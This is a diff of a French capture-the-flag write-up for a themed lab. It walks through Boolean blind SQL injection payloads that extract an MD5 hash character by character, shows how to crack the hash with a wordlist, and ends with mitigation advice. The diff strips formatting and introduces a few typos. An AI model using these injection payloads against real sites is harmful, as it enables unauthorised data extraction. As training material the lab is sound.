@@ -10,24 +10,24 @@ Bravo ! Tu es dans **Castral-Roc**, dans la salle du mestre où sont stockées d
 
 **Mission** : Trouver **l’espion infiltré chez les Stark à Winterfell** et récupérer **son hash MD5**.
 
-### 🔹 Informations de la table `allies`
-- `username` : Nom de l’individu (hashé en MD5)
-- `relation` : **famille / allié / espion / ennemi**
-- `localisation` : Lieu d'opération
+### 🔹 Informations de la table allies
+- username : Nom de l’individu (hashé en MD5)
+- relatio` : **famille / allié / espion / ennemi**
+- localisation : Lieu d'opération
 
 📌 **Problèmes de sécurité** :
-- **Injection SQL Boolean Blind (`CWE-89`)** permettant d’extraire les données cachées.
-- **Stockage MD5 (`CWE-328`)** permettant une attaque par dictionnaire.
+- **Injection SQL Boolean Blind (CWE-8`)** permettant d’extraire les données cachées.
+- **Stockage MD5 (CWE-328)** permettant une attaque par dictionnaire.
 
 📌 **Flag 1** : Le **hash MD5** du nom de l’espion infiltré chez les Stark à Winterfell.
-📌 **Flag 2** : Le **nom de l’espion en clair** (`orland mertens`).
+📌 **Flag 2** : Le **nom de l’espion en clair** (orland mertens).
 
 ---
 
 ## ⚙️ Environnement
-- **Cible :** `http://lannister.castral-roc.lannisport.south/sql_blind_hash.php`
-- **Base de données :** `lannisport_db`
-- **Données sensibles :** Table `allies`
+- **Cible :** http://lannister.castral-roc.lannisport.south/sql_blind_hash.php
+- **Base de données :** lannisport_db
+- **Données sensibles :** Table allies
 - **Wordlist fournie** : Liste des 5000 personnes du château
 
 ---
@@ -37,7 +37,7 @@ Dans le champ **Nom** du formulaire, entre :
 ```sql
 ' OR 1=1 --
 ```
-✅ **Si la réponse est `L’utilisateur est un allié`, alors l’injection SQL fonctionne.**
+✅ **Si la réponse est L’utilisateur est un allié, alors l’injection SQL fonctionne.**
 
 
 ---
@@ -47,7 +47,7 @@ Dans le champ **Nom**, entre :
 ```sql
 ' OR (SELECT COUNT(*) FROM allies WHERE relation='espion' AND localisation='Winterfell') > 0 --
 ```
-✅ **Si la page affiche `L’utilisateur est un allié`, alors un espion est bien présent.**
+✅ **Si la page affiche L’utilisateur est un allié, alors un espion est bien présent.**
 
 
 ---
@@ -59,9 +59,9 @@ Dans le champ **Nom**, entre :
 ```sql
 ' OR (SELECT ASCII(SUBSTRING(username, 1, 1)) FROM allies WHERE relation='espion' AND localisation='Winterfell') = 54 --
 ```
-✅ **Si la page affiche `L’utilisateur est un allié`, alors le premier caractère du hash est `54` (hexadécimal).**
+✅ **Si la page affiche L’utilisateur est un allié, alors le premier caractère du hash est 54 (hexadécimal).**
 
-Répète en changeant `1, 1` par `2, 1`, `3, 1`… jusqu'à obtenir le hash MD5 complet !
+Répète en changeant 1, 1 par 2, 1, 3, 1 … jusqu'à obtenir le hash MD5 complet !
 
 
 ---
@@ -154,7 +154,7 @@ with open(WORDLIST, "r", encoding="utf-8") as file:
 ```bash
 python3 crack_md5.py
 ```
-🚀 **Il affichera `orland mertens` !**
+🚀 **Il affichera orland mertens !**
 
 
 ---
@@ -162,22 +162,22 @@ python3 crack_md5.py
 ## 🏆 Validation du CTF
 🚀 **Félicitations, tu as terminé la mission !** 🔥
 
-📌 **Flag 1** : `MD5 du nom de l’espion`
-📌 **Flag 2** : `orland mertens`
+📌 **Flag 1** : MD5 du nom de l’espion
+📌 **Flag 2** : orland mertens
 
 
 ---
 
 ## 🔒 Mitigation & Sécurisation
-- **Éviter l’injection SQL** → Utiliser **des requêtes préparées** (`mysqli_stmt_bind_param`).
-- **Ne pas stocker les mots de passe / noms sensibles en MD5** → Utiliser `bcrypt`.
-- **Limiter les tentatives de requêtes Boolean Blind** → Protection par `fail2ban` et `CAPTCHA`.
+- **Éviter l’injection SQL** → Utiliser **des requêtes préparées** (mysqli_stmt_bind_param).
+- **Ne pas stocker les mots de passe / noms sensibles en MD5** → Utiliser bcrypt.
+- **Limiter les tentatives de requêtes Boolean Blind** → Protection par fail2ban et CAPTCHA.
 
 ---
 
 ## 🎯 Conclusion
-✔ **Exploitation d’une injection SQL Boolean Blind (`CWE-89`).**
+✔ **Exploitation d’une injection SQL Boolean Blind (CWE-89).**
 ✔ **Exfiltration du hash MD5 de l’espion infiltré chez les Stark.**
-✔ **Brute-force du hash MD5 avec une wordlist pour retrouver `orland mertens`.**
+✔ **Brute-force du hash MD5 avec une wordlist pour retrouver orland mertens.**
 
 🚀 **CTF réussi ! Prêt pour la prochaine mission ?** 🔥
